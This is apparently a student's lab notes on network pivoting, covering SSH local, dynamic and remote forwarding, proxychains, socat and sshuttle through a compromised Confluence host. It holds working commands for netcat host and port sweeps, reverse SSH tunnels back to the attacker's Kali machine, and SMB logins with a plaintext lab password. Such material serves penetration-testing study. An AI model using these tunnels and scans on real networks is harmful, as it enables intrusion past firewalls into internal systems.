
192.168.x.x --> Kali IP and CONFLUENCE01 IP network
10.4.x.x       --> PGDATABASE01 IP network
172.x.x.x     --> Third network

add -p 2222 always

we can us local port when we want to access specif service and download data not just read like Socat
# SSH Local port

with Socat listening and forwarding were both done from the same host (CONFLUENCE01)

![[Pasted image 20240514032215.png]]

more extended scenario

again we are with same previous exploit and get shell for Confluence01

and as we are doing ssh local forwarding, we will be listing on **Confluence01** and server will be **PGDATABASE01**

we do ssh to **PGDATABASE01**

![[Pasted image 20240514033824.png]]


### Dual NIC

![[Pasted image 20240514034105.png]]

### Finding other machine on 2nd NIC

as we don't have any tools available to ping sweep but still we can run simple bash ping one-liner

```
for i in $(seq 1 254); do nc -zv -w 1 172.16.233.$i 445; done
<(seq 1 254); do nc -zv -w 1 172.16.233.$i 445; done
```

![[Pasted image 20240514034350.png]]

![[Pasted image 20240514034406.png]]

Hit on `172.16.233.217`


--> Now exit from that shell as we get the IP of other machine so we can focus only on that and do SSH local forwarding

### forwarding

```
ssh -N -L 0.0.0.0:4455:172.16.233.217:445 database_admin@10.4.233.215
```

the SSH connection from CONFLUENCE01 to PGDATABASE01 using ssh, logging in as database_admin. We'll pass the local port forwarding argument we just put together to -L, and use -N to prevent a shell from being opened.

![[Pasted image 20240514035229.png]]

We will not see any output due to -N option

### verify forwarding

get another shell (also 4444 can work again as it is not being actively used)

```
ss -plunt
```

![[Pasted image 20240514035425.png]]

> Connecting to port 4455 on CONFLUENCE01 will now be just like connecting directly to port 445 on 172.16.50.217


![[Pasted image 20240514035512.png]]

### Accessing 4455 = 445 (SMB)

we can access Confluence01 and it has now new port 4455 which is bind to 445 at 172.16.x.x:445 via PGDATABASE01

![[Pasted image 20240514035909.png]]


![[Pasted image 20240514035923.png]]


# SSH Dynamic port

> [!NOTE]
> Local port forwarding has one glaring limitation: we can only connect to one socket per SSH connection.

SSH dynamic port forwarding works because the listening port that the SSH client creates is a SOCKS2 proxy server port.

The only limitation is that the packets have to be properly formatted - most often by SOCK-compatible client software.

![[Pasted image 20240514045145.png]]

make sure we are in TTY shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### SSH -D
```
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

IP of second machine which is on dual NIC on CONFLUENCE01

![[Pasted image 20240514191450.png]]

we can verify with `ss -plunt`

> The way Proxychains works is a light hack. It uses the Linux shared object preloading technique (LD_PRELOAD) to hook _libc_ networking functions within the binary that gets passed to it, and forces all connections over the configured proxy server. This means it might not work for everything, but will work for most _dynamically-linked binaries_ that perform simple network operations. It won't work on _statically-linked binaries_.

### set SOCKS

![[Pasted image 20240514191745.png]]

now we can n=connect normally to 172 client

```
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

```
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

### Quick nmap
```
for port in {4800..4900}; do proxychains nc -zv -w1 172.16.233.217 $port 2>&1 | grep OK; done
```
# SSH Remote port

While in local and dynamic port forwarding, the listening port is bound to the SSH client, in remote port forwarding, the listening port is bound to the SSH server.

When we got firewall and specific port is allowed then we can't listen on that machine so that we need all traffic in our kali

![[Pasted image 20240514225657.png]]

### start SSH server
First, we'll need to enable the SSH server on our Kali machine

```
sudo kilall ssh

sudo systemctl start ssh
```

![[Pasted image 20240514231005.png]]

Verification

```
sudo ss -plunt
```

![[Pasted image 20240514231027.png]]

### forwarding

```
ssh -N -R 127.0.0.1:2345:10.4.209.215:5432 kali@kali_IP -p 2222
```

![[Pasted image 20240514231440.png]]

### Verify

![[Pasted image 20240514231530.png]]

### Connect service

```
psql -h 127.0.0.1 -p 2345 -U postgres
```

![[Pasted image 20240514231637.png]]


# SSH Remote Dynamic port

Also we need version >=7.6 for ssh

again same situation as local like we can bind one port only with SSH remote port

Just as the name suggests, remote dynamic port forwarding creates a dynamic port forward in the remote configuration. The SOCKS proxy port is bound to the SSH server, and traffic is forwarded from the SSH client.

![[Pasted image 20240515001811.png]]

This time we find a Windows server (MULTISERVER03) on the DMZ network. The firewall prevents us from connecting to any port on MULTISERVER03, or any port other than TCP/8090 on CONFLUENCE01 from our Kali machine. But we can SSH out from CONFLUENCE01 to our Kali machine, then create a remote dynamic port forward so we can start enumerating MULTISERVER03 from Kali

![[Pasted image 20240515002000.png]]

### start SSH server

```
sudo kilall ssh

sudo systemctl start ssh
```

### forwarding

must be done in TTY shell

```
ssh -N -R 9998 kali@192.168.45.158 -p2222
```


### verify

![[Pasted image 20240515003810.png]]
### SOCKS

![[Pasted image 20240515003712.png]]

### Find port

```
for port in {9000..9100}; do proxychains nc -zv -w1 10.4.209.64 $port 2>&1 | grep OK; done
```

> [!NOTE]
> Run commands with proxychains


# SSHUTTLE

it requires root privileges on the SSH client and Python3 on the SSH server

In our lab environment, we have SSH access to PGDATABASE01, which we can access through a port forward set up on CONFLUENCE01

### port forward 
on CONFLUENCE01, listening on port 2222 on the WAN interface and forwarding to port 22 on PGDATABASE01

```
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```


### set sshuttle

```
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

![[Pasted image 20240515004341.png]]

#### testing

```
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

![[Pasted image 20240515004414.png]]

